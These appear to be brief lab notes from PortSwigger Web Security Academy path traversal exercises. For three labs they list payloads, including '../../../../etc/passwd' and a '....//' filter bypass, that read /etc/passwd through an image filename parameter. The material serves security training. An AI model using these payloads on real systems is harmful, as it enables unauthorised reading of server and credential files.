endpoint
parametr=value
<br><br>
<hr>
<br><br>
<h2>Lab: File path traversal, simple case</h2>


original:
https://0aa1006204c2baa2817a3e83008100b9.web-security-academy.net/image?filename=8.jpg

payload:
../../../../etc/passwd
https://0aa1006204c2baa2817a3e83008100b9.web-security-academy.net/image?filename=../../../../etc/passwd

<img width="987" height="716" alt="image" src="https://github.com/user-attachments/assets/734104ac-7a51-41f8-aaac-3ba208ede700" />


<br><br>
<hr>
<br><br>
<h2>Lab: File path traversal, traversal sequences blocked with absolute path bypass</h2>

original:
https://0a180092032b4da483c8aa9c008500ad.web-security-academy.net/image?filename=45.jpg

payload:
/etc/passwd
https://0aa1006204c2baa2817a3e83008100b9.web-security-academy.net/image?filename=/etc/passwd


<img width="989" height="672" alt="image" src="https://github.com/user-attachments/assets/b9ba1bd4-98f7-4616-b209-8e95f61f2ae1" />
<img width="891" height="558" alt="image" src="https://github.com/user-attachments/assets/820337f8-314d-4bc0-91d2-4710a1e2fcf4" />
<img width="878" height="629" alt="image" src="https://github.com/user-attachments/assets/4e3243c1-b0bb-4a75-80f3-075f98a90c93" />

<br><br>
<hr>
<br><br>
<h2>Lab: File path traversal, traversal sequences stripped non-recursively</h2>

payload:
....//....//....//etc/passwd
https://0aa1006204c2baa2817a3e83008100b9.web-security-academy.net/image?filename=....//....//....//etc/passwd


